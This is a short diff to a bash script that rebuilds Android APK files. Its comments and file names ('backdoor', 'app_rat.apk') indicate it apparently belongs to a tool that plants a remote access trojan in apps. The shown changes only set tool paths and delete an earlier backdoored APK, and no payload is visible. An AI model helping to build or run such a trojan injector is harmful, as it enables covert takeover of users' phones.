@@ -25,9 +25,9 @@ UNZIP=unzip
 KEYTOOL=keytool
 JARSIGNER=jarsigner
 APKTOOL=apktool
-PROGUARD=proguard
-DX=dx
-ZIPALIGN=zipalign
+PROGUARD=third-party/proguard5.3.2/lib/proguard
+DX=third-party/android-sdk-linux/build-tools/25.0.2/dx
+ZIPALIGN=third-party/android-sdk-linux/build-tools/25.0.2/zipalign
 # file paths and misc
 MY_PATH=`pwd`
 ORIG_APK_FILE=app.apk
@@ -39,15 +39,8 @@ TIME_OF_RUN=`date`
 FUNC_RESULT=""
 cp $1 $MY_PATH/app.apk >>$LOG_FILE 2>&1
 
-#check if proguard is installed
-which proguard > /dev/null 2>&1
-if [ "$?" -eq "0" ]; then
-echo ""
-else
-echo ""
-echo "Proguard not detected , Installing it"
-sudo apt-get install proguard -y
-fi
+#cleaning any previous backdoor created
+rm -rf $MY_PATH/app_rat.apk > /dev/null 2>&1
 
 # functions
 function find_smali_file {
